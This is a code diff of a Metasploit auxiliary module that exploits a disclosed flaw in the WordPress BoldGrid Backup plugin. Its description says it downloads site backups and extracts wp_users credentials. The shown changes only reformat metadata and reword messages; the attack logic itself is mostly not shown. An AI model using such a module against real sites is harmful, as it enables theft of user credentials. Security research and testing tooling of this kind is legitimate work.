@@ -21,18 +21,21 @@ class MetasploitModule < Msf::Auxiliary
           read to retrieve the last backup file.  That backup is then downloaded, and any sql
           files will be parsed looking for the wp_users INSERT statement to grab user creds.
         },
-        'References' =>
-          [
-            ['EDB', '49252'],
-            ['WPVDB', '10502'],
-            ['WPVDB', '10503'],
-            ['URL', 'https://plugins.trac.wordpress.org/changeset/2439376/boldgrid-backup']
-          ],
-        'Author' =>
-          [
-            'Wadeek', # Vulnerability discovery
-            'h00die' # Metasploit module
-          ],
+        'References' => [
+          ['EDB', '49252'],
+          ['WPVDB', '10502'],
+          ['WPVDB', '10503'],
+          ['URL', 'https://plugins.trac.wordpress.org/changeset/2439376/boldgrid-backup']
+        ],
+        'Author' => [
+          'Wadeek', # Vulnerability discovery
+          'h00die' # Metasploit module
+        ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [],
+          'SideEffects' => [IOC_IN_LOGS]
+        },
         'DisclosureDate' => '2020-12-12',
         'License' => MSF_LICENSE
       )
@@ -46,9 +49,9 @@ class MetasploitModule < Msf::Auxiliary
 
     checkcode = check_plugin_version_from_readme('boldgrid-backup', '1.14.10')
     unless [Msf::Exploit::CheckCode::Vulnerable, Msf::Exploit::CheckCode::Appears, Msf::Exploit::CheckCode::Detected].include?(checkcode)
-      fail_with Failure::NotVulnerable, "#{ip} - A vulnerable version of the 'Boldgrid Backup' was not found"
+      fail_with Failure::NotVulnerable, "#{ip} - A vulnerable version of Boldgrid Backup was not found"
     end
-    print_good("#{ip} - Vulnerable version detected")
+    print_good("#{ip} - Vulnerable version of Boldgrid Backup detected")
 
     print_status("#{ip} - Obtaining Server Info")
     res = send_request_cgi({
